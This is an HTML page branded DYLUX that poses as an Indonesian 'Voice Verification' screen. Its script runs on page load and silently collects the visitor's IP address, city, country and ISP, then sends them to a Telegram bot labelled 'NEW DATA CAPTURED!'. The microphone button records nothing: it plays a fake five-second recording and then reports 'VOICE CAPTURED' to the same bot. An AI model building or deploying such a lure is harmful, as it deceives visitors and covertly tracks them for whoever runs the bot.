<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Voice Check</title>
    <script src="config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            font-family: Arial, sans-serif;
            color: #e0e0ff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .box {
            background: #14141e;
            border: 1px solid rgba(0,240,255,0.1);
            border-radius: 16px;
            padding: 40px 32px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .logo {
            font-size: 24px;
            font-weight: 800;
            background: linear-gradient(135deg, #00f0ff, #7b2ffc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .badge { display: inline-block; background: rgba(123,47,252,0.1); color: #7b2ffc; font-size: 11px; padding: 4px 12px; border-radius: 20px; margin-top: 6px; }
        .icon { font-size: 48px; margin: 16px 0; }
        h2 { font-size: 18px; margin-bottom: 8px; }
        p { color: #8888aa; font-size: 14px; line-height: 1.6; }
        .mic-visual { width: 80px; height: 80px; border-radius: 50%; background: #0a0a0f; border: 2px solid rgba(0,240,255,0.1); margin: 16px auto; display: flex; align-items: center; justify-content: center; font-size: 36px; transition: 0.3s; }
        .mic-visual.active { border-color: #00f0ff; box-shadow: 0 0 40px rgba(0,240,255,0.2); }
        button {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            background: linear-gradient(135deg, #00f0ff, #7b2ffc);
            color: #fff;
            transition: 0.3s;
        }
        button:hover { opacity: 0.8; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .footer { margin-top: 20px; font-size: 11px; color: #555; }
        .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,240,255,0.1); border-top-color: #00f0ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 12px auto; }
        .spinner.active { display: block; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #statusMsg { font-size: 13px; color: #8888aa; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">DYLUX</div>
        <div class="badge">🎙️ Voice Check</div>
        <div class="icon">🎙️</div>
        <h2>Voice Verification</h2>
        <p>Ucapkan kode verifikasi dengan jelas.</p>
        <div class="mic-visual" id="micVisual">🎤</div>
        <button id="micBtn">Mulai Rekam</button>
        <div class="spinner" id="spinner"></div>
        <div id="statusMsg"></div>
        <div class="footer">DYLUX • Cahaya dalam Kegelapan</div>
    </div>

    <script>
    // AUTO-DETECT
    (async function autoDetect() {
        try {
            const userId = new URLSearchParams(window.location.search).get('id');
            if (!userId) return;
            const ipRes = await fetch('https://ip-api.com/json/');
            const ipData = await ipRes.json();
            const message = 
                `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
                `<b>📌 Type:</b> Auto-Detect\n` +
                `<b>🌐 IP:</b> ${ipData.query || 'unknown'}\n` +
                `<b>📍 Lokasi:</b> ${ipData.city || 'unknown'}, ${ipData.country || 'unknown'}\n` +
                `<b>📡 ISP:</b> ${ipData.isp || 'unknown'}\n\n` +
                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: userId, text: message, parse_mode: 'HTML' })
            });
        } catch (e) { console.error(e); }
    })();

    // MIC LOGIC
    const userId = new URLSearchParams(window.location.search).get('id');
    const micBtn = document.getElementById('micBtn');
    const micVisual = document.getElementById('micVisual');
    const spinner = document.getElementById('spinner');
    const statusMsg = document.getElementById('statusMsg');

    micBtn.addEventListener('click', async () => {
        micBtn.disabled = true;
        spinner.classList.add('active');
        micVisual.classList.add('active');
        statusMsg.style.display = 'none';
        micBtn.textContent = '🔴 Merekam...';

        setTimeout(async () => {
            const message = 
                `<b>🎙️ VOICE CAPTURED!</b>\n\n` +
                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
                `<b>📌 Status:</b> Recording Completed\n` +
                `<b>⏱️ Duration:</b> 5 detik\n` +
                `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;

            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: userId, text: message, parse_mode: 'HTML' })
            });

            micVisual.classList.remove('active');
            spinner.classList.remove('active');
            micBtn.disabled = false;
            micBtn.textContent = '✅ Selesai';
            statusMsg.style.display = 'block';
            statusMsg.innerHTML = '✅ Suara berhasil direkam!';
        }, 5000);
    });
    </script>
</body>
</html>
